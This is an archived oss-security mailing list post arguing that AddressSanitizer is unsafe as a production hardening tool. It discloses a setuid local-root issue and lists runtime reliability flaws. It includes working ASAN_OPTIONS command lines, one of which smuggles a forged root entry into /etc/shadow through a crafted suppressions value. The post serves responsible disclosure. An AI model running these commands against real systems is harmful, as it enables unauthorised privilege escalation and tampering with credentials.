X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3947" "Wednesday" "17" "February" "2016" "23:19:21" "+0100" "Szabolcs Nagy" "nsz@port70.net" "<20160217221921.GB24130@port70.net>" "99" "[oss-security] Address Sanitizer local root" "^Date:" nil nil "2" "2016021722:19:21" "[oss-security] Address Sanitizer local root" (number mark "        nsz@port70.n Feb 17   99/3947  " thread-indent "\"[oss-security] Address Sanitizer local root\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 17590 invoked by uid 550); 17 Feb 2016 22:23:06 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 15374 invoked from network); 17 Feb 2016 22:19:33 -0000
Message-ID: <20160217221921.GB24130@port70.net>
Mail-Followup-To: oss-security@lists.openwall.com
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.5.24 (2015-08-30)
Date: Wed, 17 Feb 2016 23:19:21 +0100
From: Szabolcs Nagy <nsz@port70.net>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Address Sanitizer local root
To: oss-security@lists.openwall.com

There is an alarming trend that Address Sanitizer and related
compiler instrumentations from compiler-rt are used as a hardening
solution and run in production.

Even though these are debugging and testing tools, there is
no clear warning against production use in their documentation:
http://clang.llvm.org/docs/
And it's obvious how a tool that catches UB can be misunderstood
as a hardening tool:

This analysis concluded that ASan can be used for protection
to stop certain attacks:
http://scarybeastsecurity.blogspot.dk/2014/09/using-asan-as-protection.html
The Tor project distributes ASan "hardened" binaries:
https://blog.torproject.org/blog/tor-browser-55a4-hardened-released
And there are various projects for full Linux distro instrumentation:
http://balintreczey.hu/blog/progress-report-on-hardened1-linux-amd64-a-potential-debian-port-with-pie-asan-ubsan-and-more/
https://blog.hboeck.de/archives/879-Safer-use-of-C-code-running-Gentoo-with-Address-Sanitizer.html
(the later was presented at FOSDEM 2016: https://fosdem.org/2016/schedule/event/csafecode/ )

While these are interesting projects, ASan should not be
used for hardening in production systems in its current form,
so at least the language ("hardening", "protection", "safe")
should be fixed.

My simple local root exploit is that ASan uses a lot
of environment variables without checking for secure
execution of setuid binaries:

ASAN_OPTIONS='verbosity=2 log_path=foo' ./suid.exe

will write to foo.$PID using escalated priviledge, so a
normal user may be able to clobber arbitrary root owned files
(by creating foo.{1,2,3,..} symlinks to it) which can lead
to local root on an "ASan hardened" Linux distribution:

ASAN_OPTIONS='suppressions="/foo
root:passwdhash:12345:0:::::
bar" log_path=foo' ./suid.exe

can easily clobber /etc/shadow with

AddressSanitizer: failed to read suppressions file '/foo
root:passwdhash:12345:0:::::
bar'

if there is any setuid root executable built with ASan.

(This is not a problem for testing where the env var based
configuration is convenient and I haven't checked if any
of the current ASan distro efforts have setuid executables
with instrumentation, but I still find it a security bug
given the improper advertisment of the sanitizer tools:
this can lead to problems if the documentation is not fixed.)

Beyond this trivial issue there are plenty reliability
problems in the sanitizer runtimes that i think deserve
at least a warning. It can crash conforming applications
because

- the shadow map overlaps with something
- ulimit -v
- overcommit is turned off
- it allocates memory but aborts on failure
- it interposes __tls_get_addr with non-as-safe code.
- it uses initial-exec TLS.
- it handles "deadly" signals like SIGBUS
  (often used by applications using mmaped files).
- the c runtime is updated and incompatible
  (with the various interposition hacks)
- does not handle c11 thread creation

some of the features reduce security:

- heuristic introspective unwind
- nice diagnositc messages at undefined behaviour
- interpositions in general (UB according to POSIX)

other limitations:

- static linking is not supported

(This is for ASan only, I briefly looked at thread
sanitizer, which seemed even worse for reliability
and safe stack that is in fact advertised for hardening
but it has plenty reliability problems, needs further
analysis.)

I believe some of the problems can be fixed by
implementing the runtimes in the libc instead of
second guessing libc behaviour with fragile
heuristics from a compiler runtime.   This would solve
most of the runtime aborts.  I can see an easy way to do
this with musl libc (because a non-host musl is easy to
distribute and link against), but non-trivial with glibc.
In either case I don't see a solution to the shadow map
commit charge unless the kernel is modified.  So I cannot
recommend even a careful reimplementation in libc for
production use for reliable systems.
